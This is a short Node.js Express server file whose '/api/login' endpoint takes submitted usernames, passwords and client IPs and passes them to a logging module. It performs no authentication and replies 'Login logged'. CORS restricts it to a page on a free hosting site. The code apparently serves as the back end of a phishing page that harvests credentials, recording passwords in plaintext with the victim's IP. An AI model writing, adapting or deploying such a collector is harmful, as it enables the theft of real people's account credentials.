const express = require('express');
const cors = require('cors');
const logLoginAttempt = require('./log');

const app = express();
app.use(cors({
  origin: 'https://mars2024.000webhostapp.com'
}));
app.use(express.json());

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  try {
    const result = await logLoginAttempt(username, password, ip);
    res.status(200).json({ message: 'Login logged', result });
  } catch (error) {
    console.error('Error logging login attempt:', error);
    res.status(500).json({ error: 'Error logging login attempt' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
